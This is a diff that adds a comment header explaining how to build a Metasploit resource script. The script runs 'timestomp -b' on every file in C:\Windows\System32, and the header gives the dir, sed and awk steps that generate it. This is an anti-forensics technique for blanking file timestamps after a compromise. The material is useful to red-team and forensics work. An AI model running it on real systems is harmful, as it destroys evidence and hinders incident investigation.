@@ -1,0 +1,15 @@
+# timestomp.rc was created using sed and awk on the output of a windows directory listing
+# It is a metasploit resource script which will perform -b on all files in C:\Windows\System32\
+# The format of each timestomp command is:
+#       timestomp [filename] -b
+# It has a runtime of O(n)
+# To create timestomp.rc:
+#   1. run a directory listing
+#       dir > listing.out
+#   2. delete any lines in the listing not containing files
+#       sed -i '/DIR/d' listing.out
+#   3. print out only the filenames
+#       awk '{print $5}' listing.out > filenames.txt
+#   4. prepend files with 'timestomp' and 'append with -b'
+#       sed '-e s/^/timestomp /' '-e s/$/ -b/' filenames.txt > timestomp.rc
+#   5. delete any extra lines
